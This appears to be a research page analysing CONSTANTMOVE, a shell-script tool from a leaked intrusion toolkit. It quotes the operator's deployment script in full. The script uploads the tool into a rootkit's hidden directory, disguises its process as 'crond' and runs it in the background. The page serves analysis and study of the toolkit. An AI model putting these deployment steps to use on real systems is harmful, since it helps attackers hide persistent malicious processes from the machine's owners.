[STOIC SURGEON](https://CybernetiX-S3C.github.io/main/stoicsurgeon)
[RESEARCH](https://CybernetiX-S3C.github.io/main/stoicsurgeon/research)
[CONTRIBUTING](https://CybernetiX-S3C.github.io/main/stoicsurgeon/contrib)
[ABOUT](https://CybernetiX-S3C.github.io/main/stoicsurgeon/about)

# CONSTANTMOVE

The dump only contains an opscript of this tool. From this opscript, we learn that CONSTANTMOVE is a shell script (has extension `.sh`) that can be run on Linux (explicit reference in opscript) and probably all other Unixes. Deploying it, is as easy as running it with bash.

The script will usually be ran "cloaked", under the protection of the STOICSURGEON rootkit.

Opscript.Constantmove:

```


# 2010-07-21 09:24:00 EDT 

# VARIABLES:
#     MAIN-DIR    = STOIC HIDDEN DIR
#     RUN-AS      = Name to run script as, will be in ps as "/bin/bash RUN_AS" (though cloaked)
#     SET-SID     = Set to nothing at all if setsid is not there (will likely only be there on Linux)

mx
:%s,MAIN_DIR,STOICHIDDENDIR,g
:%s,RUN_AS,crond,g
:%s,SET_SID,setsid,g
`x





# DEPLOYMENT: 

-cd MAIN_DIR
-lsh sed "s,# .*,,g" /current/up/constantmove.sh | sed "s,^ *$,,g" | sed "s,die  *\([0-9][0-9]*\).*,die \1,g" | grep -v "^$" > /current/up/constantmove.sh.clean ; cat /current/up/constantmove.sh.clean
-put /current/up/constantmove.sh.clean RUN_AS
-addpath .
-wh -U setsid RUN_AS
# note the NEXT LINE is backgrounded with an AMPERSAND
SET_SID RUN_AS &
=ps | egrep -v grep | egrep "sh |RUN_AS|sleep"
```
